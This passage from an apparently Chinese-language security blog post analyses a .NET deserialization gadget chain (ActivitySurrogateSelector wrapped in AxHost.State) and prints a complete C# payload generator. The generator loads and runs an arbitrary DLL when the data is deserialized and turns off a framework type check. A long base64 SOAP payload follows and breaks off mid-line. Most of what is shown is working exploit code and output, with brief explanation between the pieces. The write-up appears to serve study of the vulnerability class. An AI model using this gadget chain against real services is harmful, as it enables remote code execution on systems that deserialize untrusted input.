(enumerator == <span class="literal">null</span>)</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">while</span> (enumerator.MoveNext())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">string</span>.Compare(enumerator.Name, <span class="string">&quot;Data&quot;</span>, <span class="literal">true</span>, CultureInfo.InvariantCulture) == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">byte</span>[] buffer = (<span class="built_in">byte</span>[]) enumerator.Value;</span><br><span class="line">              <span class="keyword">if</span> (buffer != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">this</span>.InitializeFromStream((Stream) <span class="keyword">new</span> MemoryStream(buffer));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Compare(enumerator.Name, <span class="string">&quot;PropertyBagBinary&quot;</span>, <span class="literal">true</span>, CultureInfo.InvariantCulture) == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">byte</span>[] buffer = (<span class="built_in">byte</span>[]) enumerator.Value;</span><br><span class="line">              <span class="keyword">if</span> (buffer != <span class="literal">null</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">this</span>.propBag = <span class="keyword">new</span> AxHost.PropertyBagStream();</span><br><span class="line">                <span class="keyword">this</span>.propBag.Read((Stream) <span class="keyword">new</span> MemoryStream(buffer));</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>在反序列化的时候他会对PropertyBagBinary进行binary反序列化。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708950267144-cfe1be80-5b4e-4cf5-b58e-89f1b1013f66.png#averageHue=%231e1d1d&clientId=u9e1fcbc0-b876-4&from=paste&height=402&id=u67e60691&originHeight=503&originWidth=1219&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66944&status=done&style=none&taskId=u138306cf-6816-4385-a0bd-884f696ebb9&title=&width=975.2" alt="image.png"><br>最主要的是这里还做了异常处理，就避免了异常发生。</p>
<h2 id="0-3-4-最终Payload"><a href="#0-3-4-最终Payload" class="headerlink" title="0-3.4 最终Payload"></a>0-3.4 最终Payload</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel.Design;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI.WebControls;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> NDesk.Options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ysoserial.Generators</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MySurrogateSelector</span> : <span class="title">SurrogateSelector</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PayloadClass</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">byte</span>[] assemblyBytes;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">int</span> variant_number = <span class="number">1</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PayloadClass</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.assemblyBytes = File.ReadAllBytes(<span class="string">&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">IEnumerable</span>&lt;<span class="title">TResult</span>&gt; <span class="title">CreateWhereSelectEnumerableIterator</span>&lt;<span class="title">TSource</span>, <span class="title">TResult</span>&gt;(<span class="params">IEnumerable&lt;TSource&gt; src, Func&lt;TSource, <span class="built_in">bool</span>&gt; predicate, Func&lt;TSource, TResult&gt; selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(<span class="string">&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>)</span><br><span class="line">              .GetType(<span class="string">&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;</span>)</span><br><span class="line">              .MakeGenericType(<span class="keyword">typeof</span>(TSource), <span class="keyword">typeof</span>(TResult));</span><br><span class="line">            <span class="keyword">return</span> t.GetConstructors()[<span class="number">0</span>].Invoke(<span class="keyword">new</span> <span class="built_in">object</span>[] &#123; src, predicate, selector &#125;) <span class="keyword">as</span> IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">PayloadClass</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">object</span>&gt; <span class="title">GadgetChains</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = <span class="literal">null</span>;</span><br><span class="line">            Hashtable ht = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">byte</span>[]&gt; data = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>[]&gt;();</span><br><span class="line">            data.Add(<span class="keyword">this</span>.assemblyBytes);</span><br><span class="line">            <span class="keyword">var</span> e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(<span class="keyword">typeof</span>(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), <span class="keyword">typeof</span>(Assembly).GetMethod(<span class="string">&quot;GetTypes&quot;</span>));</span><br><span class="line">            <span class="keyword">var</span> e2 = e1.SelectMany(map_type);</span><br><span class="line">            <span class="keyword">var</span> e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = <span class="keyword">new</span> PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(<span class="keyword">typeof</span>(<span class="built_in">int</span>).Assembly.GetType(<span class="string">&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;</span>), pds);</span><br><span class="line">            verb = <span class="keyword">new</span> DesignerVerb(<span class="string">&quot;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">typeof</span>(MenuCommand).GetField(<span class="string">&quot;properties&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = <span class="keyword">new</span> List&lt;<span class="built_in">object</span>&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            ht.Add(verb, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            ht.Add(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(<span class="string">&quot;buckets&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(<span class="string">&quot;key&quot;</span>, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">object</span> bucket = keys.GetValue(i);</span><br><span class="line">                <span class="built_in">object</span> key = fi_key.GetValue(bucket);</span><br><span class="line">                <span class="keyword">if</span> (key <span class="keyword">is</span> <span class="built_in">string</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">GadgetChainsToBinaryFormatter</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = <span class="keyword">new</span> System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = <span class="keyword">new</span> MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(<span class="string">&quot;In GetObjectData&quot;</span>);</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(<span class="string">&quot;PropertyBagBinary&quot;</span>, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Exp</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = <span class="keyword">new</span> PayloadClass();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//构建formatter</span></span><br><span class="line">                SoapFormatter sp1 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">                sp1.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">var</span> sp2=<span class="keyword">new</span> SoapFormatter();</span><br><span class="line">                <span class="comment">// var bn=new BinaryFormatter();</span></span><br><span class="line">                sp2.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终payload如上，经过了一层State包装就保证了不会报错。至此这条利用链就完成了</p>
<h1 id="0-4-ActivitySurrogateSelectorFromFile"><a href="#0-4-ActivitySurrogateSelectorFromFile" class="headerlink" title="0-4 ActivitySurrogateSelectorFromFile"></a>0-4 ActivitySurrogateSelectorFromFile</h1><p>只是取这个名字而已，就是动态控制dll文件的内容，不难实现，ysoserial帮我们做好了。</p>
<h1 id="0-5-小结"><a href="#0-5-小结" class="headerlink" title="0-5 小结"></a>0-5 小结</h1><p>到这里可以发现其实和标题的Soap是没啥关系的。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:SOAP-ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xm</span></span></span><br><span class="line"><span class="tag"><span class="attr">lns:SOAP-ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:clr</span>=<span class="string">&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot;</span> <span class="attr">SOAP-ENV:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/enc</span></span></span><br><span class="line"><span class="string"><span class="tag">oding/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a1:AxHost_x002B_State</span> <span class="attr">id</span>=<span class="string">&quot;ref-1&quot;</span> <span class="attr">xmlns:a1</span>=<span class="string">&quot;http://schemas.microsoft.com/clr/nsassem/System.Windows.Forms/System.Windows.Forms%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20P</span></span></span><br><span class="line"><span class="string"><span class="tag">ublicKeyToken%3Db77a5c561934e089&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PropertyBagBinary</span> <span class="attr">href</span>=<span class="string">&quot;#ref-3&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a1:AxHost_x002B_State</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENC:Array</span> <span class="attr">id</span>=<span class="string">&quot;ref-3&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;SOAP-ENC:base64&quot;</span>&gt;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuM</span><br><span class="line">C4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAABwAAAAcAAAAQAgAAAAgAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAA</span><br><span class="line">CQgAAAAJCQAAAAoMCgAAAGFTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQMAAABqU3lzdGVtLldvcmtmbG9</span><br><span class="line">3LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFH1N5c3RlbS5Vbml0eVNlcmlhbG</span><br><span class="line">l6YXRpb25Ib2xkZXIKAAAACQsAAAAJDAAAAAEEAAAAAwAAAAkNAAAACQ4AAAABBQAAAAMAAAAJDwAAAAkQAAAAAQYAAAADAAAACREAAAAJEgAAAAEHAAAAAwAAAAkTAAAACRQAAAABCAAAAAMAAAAJFQAAAAkWAAAABAkAAAAcU3lzdGVtL</span><br><span class="line">kNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0</span><br><span class="line">ZW0uQ29sbGVjdGlvbnMuSUhhc2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJFwAAAAkYAAAABAsAAAAfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgMAAAAERGF0YQlVbml0eVR5cGUMQXNzZW1ibHlOYW1lAQABCAYZAAA</span><br><span class="line">A+AFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0TGlzdEl0ZXJhdG9yYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNT</span><br><span class="line">YxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAGGgAAAE5TeXN0ZW0uQ</span><br><span class="line">29yZSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQDAAAAAcAAAAJGwAAAAoJHAAAAAkdAAAACAgAAAAACggIAQAAAAENAAAACwAAAAYeAAAA+AFTeXN0ZW0uTGlu</span><br><span class="line">cS5FbnVtZXJhYmxlKzxTZWxlY3RNYW55SXRlcmF0b3I+ZF9fMTdgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTV</span><br><span class="line">jNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJGgAAABAOAAAACQAAAAgI/v///woICAEAAA</span><br><span class="line">AKCQMAAAAKCSEAAAANAgEPAAAACwAAAAYiAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlP</span><br><span class="line">W5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODld</span><br><span class="line">XQQAAAAJGgAAABAQAAAABwAAAAkEAAAACgklAAAACggIAAAAAAoICAEAAAABEQAAAAsAAAAGJgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGJwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4</span><br><span class="line">wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRASAAAABwAAAAkFAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARMAAAALAAAABikAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2</span><br><span class="line">lnbi5EZXNpZ25lclZlcmIEAAAABioAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAUAAAABQAAAA0CCSsAAAAICAMAAAAJCAAAAAEVAAAACwAAA</span><br><span class="line">AYtAAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABi4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1</span><br><span class="line">NjE5MzRlMDg5EBYAAAABAAAACQYAAAAQFwAAAAIAAAAJBwAAAAkHAAAAEBgAAAACAAAABjEAAAAACTEAAAAEGwAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9</span><br><span class="line">uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24DAAAPU3lzdGVtLkJ5dGVbXVtdCAgJMgAAAAEAAAABAAAABBwAAAAiU3lzdGVtLk</span><br><span class="line">RlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgIAAAAIRGVsZWdhdGUHbWV0aG9kMAMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsa</span><br><span class="line">XphdGlvbkhvbGRlcgkzAAAACTQAAAAEHQAAAIoBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxK0VudW1lcmF0b3JbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwg</span><br><span class="line">UHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAARsaXN0BWluZGV4B3ZlcnNpb24HY3VycmVudAMAAAd/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2l</span><br><span 